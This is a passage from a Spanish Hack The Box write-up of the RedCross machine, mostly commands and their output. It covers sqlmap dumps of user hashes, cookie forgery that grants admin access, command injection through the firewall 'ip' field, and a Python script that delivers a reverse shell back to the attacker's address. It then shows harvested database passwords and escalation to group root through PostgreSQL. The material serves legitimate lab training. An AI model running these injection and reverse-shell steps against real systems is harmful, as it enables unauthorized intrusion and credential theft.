+----------+-------------+
| id       | int(11)     |
| mail     | varchar(30) |
| password | varchar(64) |
| role     | int(11)     |
| username | varchar(20) |
+----------+-------------+

xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent -D redcross -T users -C id,mail,password,role,username --dump

Database: redcross
Table: users
[5 entries]
+----+------------------------------+--------------------------------------------------------------+------+----------+
| id | mail                         | password                                                     | role | username |
+----+------------------------------+--------------------------------------------------------------+------+----------+
| 1  | admin@redcross.htb           | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | 0    | admin    |
| 2  | penelope@redcross.htb        | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | 1    | penelope |
| 3  | charles@redcross.htb         | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | 1    | charles  |
| 4  | tricia.wanderloo@contoso.com | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | 100  | tricia   |
| 5  | non@available                | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | 1000 | guest    |
+----+------------------------------+--------------------------------------------------------------+------+----------+


xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent -D redcross -T messages --dump

Database: redcross
Table: messages
[8 entries]
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| id | body                                                                                                                                                                                         | dest | origin | subject                                      |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| 1  | You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.              | 5    | 1      | Guest Account Info                           |
| 2  | Hi Penny, can you check if is there any problem with the order? I'm not receiving it in our EDI platform.                                                                                    | 2    | 4      | Problems with order 02122128                 |
| 3  | Please could you check the admin webpanel? idk what happens but when I'm checking the messages, alerts popping everywhere!! Maybe a virus?                                                   | 3    | 1      | Strange behavior                             |
| 4  | Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.                                                                                                       | 4    | 2      | Problems with order 02122128                 |
| 5  | Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!                                           | 2    | 3      | admin subd webapp problems                   |
| 6  | Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR                                                      | 3    | 2      | admin subd webapp problems (priority)        |
| 7  | Hi, Please stop checking messages from intra platform, it's possible that there is a vuln on your admin side...                                                                              | 1    | 2      | STOP checking messages from intra (priority) |
| 8  | Sorry but I can't do that. It's the only way we have to communicate with partners and we are overloaded. Doesn't look so bad... besides that what colud happen? Don't worry but fix it ASAP. | 2    | 1      | STOP checking messages from intra (priority) |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+

xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent -D redcross -T requests --dump
Database: redcross
Table: requests
[0 entries]
+----+------+-------+---------+
| id | body | cback | subject |
+----+------+-------+---------+
+----+------+-------+---------+

```

Bastante información, de la cual tenemos hashes bcrypt (tardaremos mucho para romperlas) y varias notas del subdomain admin que descubrimos anteriormente. No pudimos conseguir ninguna credencial mas que guest, pero había un detalle interesante sobre nuestra cookie que devolvía intra al ingresar, la variable **DOMAIN**. Probemos si el manejo de autenticación esta roto.

# Login on admin

También al leer la descripción del problema que reportan los usuarios detectaremos que se trata de un XSS. En este caso seguiremos el camino de manejo de cookies, gracias un *hit* de un mago.

Primero obtengamos una cookie de intra:

``` text
xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest submit=Login action=login

<omitiendo>

PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=intra;
```

Ahora cambiemos donde diga intra por admin y preparemos una petición GET:

``` text
xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb" "Cookie:PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=admin;"
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 466
Content-Type: text/html; charset=UTF-8
Keep-Alive: timeout=5, max=100
Location: /?page=cpanel
Pragma: no-cache
Server: Apache/2.4.25 (Debian)

<center><a href=/><table border=0 width=95%><tr><td><table border=0><tr><td width=10% rowspan=2><img src='/images/it.svg' width='100%'></td><td valign='bottom'><h2>IT Admin panel</h2></td></tr><tr><td valign='top'><h3>Authorized personnel only</h3></td></tr></table></td><td width=100px><p style='font-size:75%'>[[guest]]</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a></center>

```

El portal que tenemos y debemos ver es el siguiente:

![admin login](/img/htb-redcross/http-admin-login.png)

# CPanel

Visitemos el cpanel de admin:

``` text
xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb/?page=cpanel" "Cookie:PHPSESSID=5a0o7947pk2gb11m6acglej5i6; LANG=EN_US; SINCE=1555227715; LIMIT=10; DOMAIN=admin;"
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 427
Content-Type: text/html; charset=UTF-8
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<center><a href=/><table border=0 width=95%><tr><td><table border=0><tr><td width=10% rowspan=2><img src='/images/it.svg' width='100%'></td><td valign='bottom'><h2>IT Admin panel</h2></td></tr><tr><td valign='top'><h3>Authorized personnel only</h3></td></tr></table></td><td width=100px><p style='font-size:75%'>[[guest]]</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a></center><center><table border=0 width=30%><tr align=center><td><a href='/?page=users'><img src='../images/users.png' width=50% alt='User Management'></a></td><td><a href='/?page=firewall'><img src='../images/firewall.png' width=50% alt='Network Access'></a></td></tr><tr align=center><td>User Management</td><td>Network Access</td></tr></table></center><br><br><center><p>Web admin system 0.9</p></center>
```

![admin cpanel](/img/htb-redcross/http-admin-cpanel.png)

Tenemos una administración de usuarios y de reglas de firewall. Comencemos por conocer **User Management** (users):

``` html
xbytemx@laptop:~/htb/redcross$ http --verify=no "https://admin.redcross.htb/?page=users" "Cookie:PHPSESSID=oiuslv12i7j2urs7u86etj3bq6; LANG=EN_US; SINCE=1553146196; LIMIT=10; DOMAIN=admin;" HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 473
Content-Type: text/html; charset=UTF-8
Date: Thu, 21 Mar 2019 06:35:56 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<center><a href=/><table border=0 width=95%><tr><td><table border=0><tr><td width=10% rowspan=2><img src='/images/it.svg' width='100%'></td><td valign='bottom'><h2>IT Admin panel</h2></td></tr><tr><td valign='top'><h3>Authorized personnel only</h3></td></tr></table></td><td width=100px><p style='font-size:75%'>[[guest]]</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a></center><center><form method=POST action='/pages/actions.php'>Add virtual user:<input type='text' name='username'>&nbsp<input type='submit' name='action' value='adduser'></form></center><center align=center><table cellspacing=5 cellpadding=5><tr><td>Username</td><td>UID</td><td>GID</td><td>Action</td></tr><tr><td>tricia</td><td>2018</td><td>1001</td><td><form action='/pages/actions.php' method=POST><input type=hidden name=uid value=2018><input type=submit name=action value=del></form></td></tr></table></center><br><br><center><p>Web admin system 0.9</p></center>
```

![admin users](/img/htb-redcross/http-admin-users.png)

Como podemos observar, se trata de una pagina donde crearemos usuarios virtuales con permisos limitados. Crearemos al usuario miau:

``` html
xbytemx@laptop:~/htb/redcross$ http --verify=no -f POST "https://admin.redcross.htb/pages/actions.php" "Cookie:PHPSESSID=oiuslv12i7j2urs7u86etj3bq6; LANG=EN_US; SINCE=1553146196; LIMIT=10; DOMAIN=admin;" username=miau action=adduser
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 111
Content-Type: text/html; charset=UTF-8
Date: Thu, 21 Mar 2019 06:37:05 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

Provide this credentials to the user:<br><br><b>miau : E8z6e6iL</b><br><br><a href=/?page=users>Continue</a>

```

Estas credenciales nos servirán para poder ingresar por SSH:

``` text
xbytemx@laptop:~/htb/redcross$ ssh miau@admin.redcross.htb
The authenticity of host 'admin.redcross.htb (10.10.10.113)' can't be established.
ECDSA key fingerprint is SHA256:yd04sZox5Ub78YD9IP7Yrslhv2TgP7lcFNiOBpZjCfk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'admin.redcross.htb,10.10.10.113' (ECDSA) to the list of known hosts.
miau@admin.redcross.htb's password:
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=2026 gid=1001(associates) groups=1001(associates)
```

Pronto nos daremos cuenta de lo limitada que es esta shell y que no cuenta con muchas herramientas que nos permitan escalar directamente a algún otro usuario o inclusive salir, al menos yo no encontré la manera.

# RCE

Veamos ahora que podemos hacer desde **Network Access** (firewall):

``` html
xbytemx@laptop:~/htb/redcross$ http --verify no https://admin.redcross.htb/?page=firewall Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;"HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 540
Content-Type: text/html; charset=UTF-8
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<center><a href=/><table border=0 width=95%><tr><td><table border=0><tr><td width=10% rowspan=2><img src='/images/it.svg' width='100%'></td><td valign='bottom'><h2>IT Admin panel</h2></td></tr><tr><td valign='top'><h3>Authorized personnel only</h3></td></tr></table></td><td width=100px><p style='font-size:75%'>[[guest]]</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a></center><center><form method=POST action='/pages/actions.php'>Whitelist IP Address: <input type='text' name='ip'>&nbsp<input type='submit' name='action' value='Allow IP'></form></center><center><table cellspacing=5 cellpadding=5><tr><td>UID</td><td>IP Address</td><td>Auth. since</td><td>Action</td></tr><tr><td>1</td><td>10.10.12.185   </td><td>2019-01-14 17:22:12.554465</td><td><form action='/pages/actions.php' method=POST><input type=hidden name=ip value=10.10.12.185   ><input type=hidden name=id value=12><input type=submit name=action value=deny></form></td></tr><tr><td>1</td><td>10.10.13.13    </td><td>2019-01-14 21:45:53.473657</td><td><form action='/pages/actions.php' method=POST><input type=hidden name=ip value=10.10.13.13    ><input type=hidden name=id value=16><input type=submit name=action value=deny></form></td></tr></table></center><br><br><center><p>Web admin system 0.9</p></center>
```

![admin firewall](/img/htb-redcross/http-admin-firewall.png)

Como podemos ver, contamos con varias reglas para permitir o denegar ciertas direcciones IP. Aquí al igual que con users, probé algunas combinaciones clásicas para un command injection, resultando esta pagina vulnerable:


``` text
xbytemx@laptop:~/htb/redcross$ http --verify=no -f POST https://admin.redcross.htb/pages/actions.php Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;" ip='1.1.1.1;ping -c1 10.10.14.84' action='Allow IP'
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 30
Content-Type: text/html; charset=UTF-8
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
refresh: 1;url=/?page=firewall

ERR: Invalid IP Address format

xbytemx@laptop:~/htb/redcross$ http --verify=no -f POST https://admin.redcross.htb/pages/actions.php Cookie:"PHPSESSID=79cdhgjto42ab714987f6258c1; LANG=EN_US; SINCE=1555294885; LIMIT=10; DOMAIN=admin;" ip='1.1.1.1;ping -c1 10.10.14.84' action=deny
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 191
Content-Type: text/html; charset=UTF-8
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding
refresh: 1;url=/?page=firewall

DEBUG: All checks passed... Executing iptables
Network access restricted to 1.1.1.1
PING 10.10.14.84 (10.10.14.84) 56(84) bytes of data.

--- 10.10.14.84 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

```

Habiendo identificado que podemos realizar un command injection desde el parametro **ip**, prepare el siguiente script de python para generar una reverse shell cada que necesite conectarme:

``` python
import requests,netifaces

urlIntraBase='https://intra.redcross.htb'
urlAdminBase='https://admin.redcross.htb'
urlActions = '/pages/actions.php'
loginParms = { "user":"guest", "pass":"guest", "action":"login"}

reverseShell = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr'] + "\",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\'"

s = requests.Session()
res = s.post(urlIntraBase + urlActions, data = loginParms, verify=False)

headersIntra = res.headers
cookie = ''
for minicookie in headersIntra["set-cookie"].replace('intra', 'admin').split(' '):
    if minicookie.split('=')[0].isupper():
        cookie += minicookie

headersAdmin = {"Cookie": cookie}
payload = {"ip":'1.1.1.1;'+reverseShell, "action":"deny"}
res = s.post(urlAdminBase + urlActions, data=payload ,headers=headersAdmin, verify=False, allow_redirects=False)
print res.text
```

# Digging as www-data

Ahora que hemos conseguido acceso al servidor, comencemos por enumerar el directorio de */var/www/html/*:

``` text
xbytemx@laptop:~/htb/redcross$ ncat -nvlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.113.
Ncat: Connection from 10.10.10.113:49806.
bash: cannot set terminal process group (776): Inappropriate ioctl for device
bash: no job control in this shell
www-data@redcross:/var/www/html/admin/pages$ ls
ls
actions.php
bottom.php
cpanel.php
firewall.php
header.php
login.php
users.php
www-data@redcross:/var/www/html/admin/pages$ cd ..
cd ..
www-data@redcross:/var/www/html/admin$ ls
ls
9a7d3e2c3ffb452b2e40784f77723938
images
index.php
init.php
pages
www-data@redcross:/var/www/html/admin$ cat init.php
cat init.php
<?php
#database configuration
$dbhost='127.0.0.1';
$dbuser='dbcross';
$dbpass='LOSPxnme4f5pH5wp';
$dbname='redcross';
?>
www-data@redcross:/var/www/html/admin$ cd ..
cd ..
www-data@redcross:/var/www/html$ ls
ls
admin
default
intra
www-data@redcross:/var/www/html$ ls -lah default
ls -lah default
total 8.0K
drwxr-xr-x 2 root root 4.0K Jun  3  2018 .
drwxr-xr-x 5 root root 4.0K Jun  3  2018 ..
www-data@redcross:/var/www/html$ ls -lah intra
ls -lah intra
total 32K
drwxr-xr-x 5 root root 4.0K Jun  8  2018 .
drwxr-xr-x 5 root root 4.0K Jun  3  2018 ..
-rw-r--r-- 1 root root  145 Jun  8  2018 .htaccess
drwxr-xr-x 2 root root 4.0K Jun  7  2018 documentation
drwxr-xr-x 2 root root 4.0K Jun  4  2018 images
-rw-r--r-- 1 root root  718 Jun  7  2018 index.php
-rw-r--r-- 1 root root  121 Jun  6  2018 init.php
drwxr-xr-x 2 root root 4.0K Jun 11  2018 pages
www-data@redcross:/var/www/html$ cat intra/init.php
cat intra/init.php
<?php
#database configuration
$dbhost='127.0.0.1';
$dbuser='dbcross';
$dbpass='LOSPxnme4f5pH5wp';
$dbname='redcross';
?>
www-data@redcross:/var/www/html$
```

Hemos encontrado unas credenciales de mysql, misma que accedimos por el SQLi.

Después de continuar analizando las aplicaciones, encontraremos que hay otra conexión a otra base de datos, una a postgresql que usaba la aplicación de *admin* para el control de red:

``` php
www-data@redcross:/var/www/html$ cat admin/pages/actions.php
cat admin/pages/actions.php
<?php
session_start();
require "../init.php";

function generateRandomString($length = 8) {
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}

if(!isset($_POST['action'])){ header('Location: /'); exit;}
else { $action=$_POST['action'];}

#echo $action; #for debugging

if($action==='login'){
	if(!isset($_POST['pass']) and !isset($_POST['user'])){
		header('refresh:3;url=/?page=login?');
		echo "ERR - missing data";
		exit;
	}
	$text="Checking provided credentials...";
	$user=$_POST['user'];
	$pass=$_POST['pass'];

	/* db select code */
	$mysqli = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
	$sql=$mysqli->prepare("SELECT id, password, mail, role FROM users WHERE username = ?");
	$sql->bind_param("s", $user);
	$sql->execute();
	$sql->store_result();
	if ($sql->num_rows === 0) {
		$text="Wrong data!";
		$hash=NULL;
	} else {
		$sql->bind_result($id,$hash,$mail,$role);
		$sql->fetch();
	}
	/* de select code end */
	if(password_verify($pass,$hash) and $role==0){
		$_SESSION['auth']=1;
		$_SESSION['userid']=$id;
		$_SESSION['mail']=$mail;
		$_SESSION['role']=$role;
		$_SESSION['username']=$user;
		$cname="LANG";
		$cvalue="EN_US";
		$ctime=time()+(86400*90);
		setcookie($cname,$cvalue,$ctime,"/");
		$cname="SINCE";
		$cvalue=time();
		$ctime=time()+(86400*90);
		setcookie($cname,$cvalue,$ctime,"/");
		$cname="LIMIT";
		$cvalue="10";
		$ctime=time()+(86400*90);
		setcookie($cname,$cvalue,$ctime,"/");
		$cname="DOMAIN";
		$cvalue="admin";
		$ctime=time()+(86400*90);
		setcookie($cname,$cvalue,$ctime,"/");
	} else if(password_verify($pass,$hash)){
		$text="Not enough privileges!";
	} else { $text="Wrong data!"; }

	header('refresh:3;url=/');
	echo $text;
	exit;
}

if($action==='end session'){
	setcookie("LANG","",1,"/");
	setcookie("SINCE","",1,"/");
	setcookie("LIMIT","",1,"/");
	setcookie("DOMAIN","",1,"/");
	setcookie("PHPSESSID","",1,"/");
	session_destroy();
	header('refresh:1;url=/');
	echo "Cleaning up session data...";
	exit;
}

if($action==='Allow IP'){
	header('refresh:1;url=/?page=firewall');
	$ip=$_POST['ip'];
	$valid = ip2long($ip) !== false;
	if(!$valid){
		echo "ERR: Invalid IP Address format";
		exit;
	}
	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
	$result = pg_prepare($dbconn, "q1", "SELECT * FROM ipgrants WHERE address = $1");
	$result = pg_execute($dbconn, "q1", array($ip));
	if(pg_num_rows($result)===0){
		$res = pg_prepare($dbconn, "q2", "INSERT INTO ipgrants ( uid, address ) VALUES ( $1, $2)");
		$res = pg_execute($dbconn, "q2", array($_SESSION['userid'], $ip));
		echo system("/opt/iptctl/iptctl allow ".$ip);
	}

}
if($action==='deny'){
	header('refresh:1;url=/?page=firewall');
	$id=$_POST['id'];
	$ip=$_POST['ip'];
	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
	$result = pg_prepare($dbconn, "q1", "DELETE FROM ipgrants WHERE id = $1");
	$result = pg_execute($dbconn, "q1", array($id));
	echo system("/opt/iptctl/iptctl restrict ".$ip);
}
if($action==='adduser'){
	$username=$_POST['username'];
	$passw=generateRandomString();
	$phash=crypt($passw);
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
	$result = pg_prepare($dbconn, "q1", "insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
	$result = pg_execute($dbconn, "q1", array($username, $phash));
	echo "Provide this credentials to the user:<br><br>";
	echo "<b>$username : $passw</b><br><br><a href=/?page=users>Continue</a>";
}
if($action==='del'){
	header('refresh:1;url=/?page=users');
	$uid=$_POST['uid'];
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
	$result = pg_prepare($dbconn, "q1", "delete from passwd_table where uid = $1");
	$result = pg_execute($dbconn, "q1", array($uid));
	echo "User account deleted";
}
?>
```

Resumiendo con grep:

``` text
www-data@redcross:/var/www/html/admin/pages$ cat * | grep pg_connect
cat * | grep pg_connect
	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
```

Convirtiendo a tabla:

| # | Host      | dbname   | user       | password      |
|---|-----------|----------|------------|---------------|
| 1 | 127.0.0.1 | redcross | www        | aXwrtUO9_aa&  |
| 2 | 127.0.0.1 | unix     | unixusrmgr | dheu%7wjx8B&  |
| 3 | 127.0.0.1 | unix     | unixnss    | fios@ew023xnw |

# PSQL

Validemos que tenemos dentro de esta base de datos, comenzando por la db con el nombre de la maquina:

``` text
www-data@redcross:/var/www/html/admin/pages$ psql -h 127.0.0.1 -d redcross -U www -W
<dmin/pages$ psql -h 127.0.0.1 -d redcross -U www -W
Password for user www: aXwrtUO9_aa&

\l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 redcross  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =Tc/postgres         +
           |          |          |             |             | postgres=CTc/postgres+
           |          |          |             |             | www=CTc/postgres
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 unix      | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
(5 rows)
```

Parece que desde aquí no podremos hacer mucho con www. Cambiemos de db y owner:

``` text
\c unix unixusrmgr
Password for user unixusrmgr: dheu%7wjx8B&

You are now connected to database "unix" as user "unixusrmgr".
\dt
            List of relations
 Schema |     Name     | Type  |  Owner
--------+--------------+-------+----------
 public | group_table  | table | postgres
 public | passwd_table | table | postgres
 public | shadow_table | table | postgres
 public | usergroups   | table | postgres
(4 rows)

\dp
                                           Access privileges
 Schema |     Name     |   Type   |      Access privileges       |    Column privileges     | Policies
--------+--------------+----------+------------------------------+--------------------------+----------
 public | group_id     | sequence |                              |                          |
 public | group_table  | table    | postgres=arwdDxt/postgres   +|                          |
        |              |          | unixnss=r/postgres           |                          |
 public | passwd_table | table    | postgres=arwdDxt/postgres   +| username:               +|
        |              |          | unixnss=r/postgres          +|   unixusrmgr=aw/postgres+|
        |              |          | unixusrmgr=rd/postgres      +| passwd:                 +|
        |              |          | unixnssroot=arwdDxt/postgres |   unixusrmgr=aw/postgres+|
        |              |          |                              | gid:                    +|
        |              |          |                              |   unixusrmgr=aw/postgres+|
        |              |          |                              | homedir:                +|
        |              |          |                              |   unixusrmgr=aw/postgres |
 public | shadow_table | table    | postgres=arwdDxt/postgres   +|                          |
        |              |          | unixpam=ar/postgres         +|                          |
        |              |          | unixnssroot=r/postgres       |                          |
 public | user_id      | sequence | postgres=rwU/postgres       +|                          |
        |              |          | unixusrmgr=U/postgres       +|                          |
        |              |          | unixnssroot=rwU/postgres     |                          |
 public | usergroups   | table    | postgres=arwdDxt/postgres   +|                          |
        |              |          | unixnss=r/postgres           |                          |
(6 rows)
```

Parece que en la tabla passwd_table con las columnas gid, username, passwd y homedir son las únicas que podemos editar.

``` text
\d passwd_table
                             Table "public.passwd_table"
  Column  |          Type          |                    Modifiers
----------+------------------------+-------------------------------------------------
 username | character varying(64)  | not null
 passwd   | character varying(128) | not null default 'x'::character varying
 uid      | integer                | not null default nextval('user_id'::regclass)
 gid      | integer                | not null
 gecos    | character varying(128) |
 homedir  | character varying(256) | not null
 shell    | character varying      | not null default '/bin/bash'::character varying
Indexes:
    "passwd_table_pkey" PRIMARY KEY, btree (uid)
    "passwd_table_username_key" UNIQUE CONSTRAINT, btree (username)
Referenced by:
    TABLE "shadow_table" CONSTRAINT "st_username_fkey" FOREIGN KEY (username) REFERENCES passwd_table(username) ON DELETE CASCADE
    TABLE "usergroups" CONSTRAINT "ug_uid_fkey" FOREIGN KEY (uid) REFERENCES passwd_table(uid) ON DELETE CASCADE

select * from passwd_table;
 username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
----------+------------------------------------+------+------+-------+----------------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
 miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 | 1001 |       | /var/jail/home | /bin/bash
(2 rows)

```

# privesc

Aparece nuestro usuario `miau`, que como recordamos pertenece a un ambiente enjaulado. Dicho ambiente enjaulado nos entregaba una shell limitada, un home donde no teníamos permisos de acercarnos al root (*/*), pero ahora que tenemos acceso a donde se encuentra estas propiedades, confiemos en que el script que se encarga de modificar la 'jaula' responda ante los cambios en la base de datos.

En el ambiente enjaulado agrega a todos los usuarios nuevos al grupo limitado con *GID* 1001, el cual nos impidió realizar algunas tareas, pero ahora que tenemos acceso a la DB, podemos cambiar esa propiedad. Cambiemos esta propiedad a 0:

``` text
update passwd_table set gid=0 where username='miau';
select * from passwd_table;
 username |               passwd               | uid  | gid  | gecos |    homedir     |   shell
----------+------------------------------------+------+------+-------+----------------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
 miau     | $1$aINCdBU3$DI6tECMqjpMZ.D5c/DkpM/ | 2020 |    0 |       | /var/jail/home | /bin/bash
(2 rows)
```

Ahora hagamos un upgrade de nuestra shell y accedamos como miau:

``` text
www-data@redcross:/var/www/html/admin/pages$ python -c 'import pty; pty.spawn("/bin/bash")'
<s$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@redcross:/var/www/html/admin/pages$ su - miau
su - miau
Password: CCutRKf7

miau@redcross:~$
```

Pero ser del grupo root no nos hace root.

``` text
miau@redcross:~$ cat /root/root.txt /home/penelope/user.txt
cat /root/root.txt /home/penelope/user.txt
cat: /root/root.txt: Permission denied
cat: /home/penelope/user.txt: Permission denied
miau@redcross:~$ ls -lah /root
ls -lah /root
total 64K
drwxr-x---  6 root root 4.0K Oct 31 12:33 .
drwxr-xr-x 22 root root 4.0K Jun  3  2018 ..
-rw-------  1 root root    0 Oct 31 12:33 .bash_history
-rw-r--r--  1 root root 3.4K Jun 10  2018 .bashrc
drwxr-xr-x  3 root root 4.0K Jun  6  2018 bin
drwxrwxr-x 11 root root 4.0K Jun  7  2018 Haraka-2.8.8
drwxr-xr-x  4 root root 4.0K Jun  7  2018 .npm
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   24 Jun 10  2018 .psqlrc
-rw-------  1 root root 1.0K Jun  3  2018 .rnd
-rw-------  1 root root   33 Jun  8  2018 root.txt
-rw-r--r--  1 root root   74 Jun  6  2018 .selected_editor
drwx------  4 root root 4.0K Jun  3  2018 .thumbnails
-rw-------  1 root root  13K Oct 31 12:30 .viminfo
```

Recordemos que como solo podemos editar el grupo, aunque lo cambiemos a root, no podremos leer todos los archivos donde los permisos solo sean de usuario.

Pero si hay una manera en la que un usuario puede adquirir todos los poderes de otro, esto es mediante SUDO. Ahora que somos del grupo chido, veamos que hay en sudoers:

``` text
miau@redcross:~$ cat /etc/sudoers | grep -E 'ALL$'
cat /etc/sudoers | grep -E 'ALL$'
root	ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
```

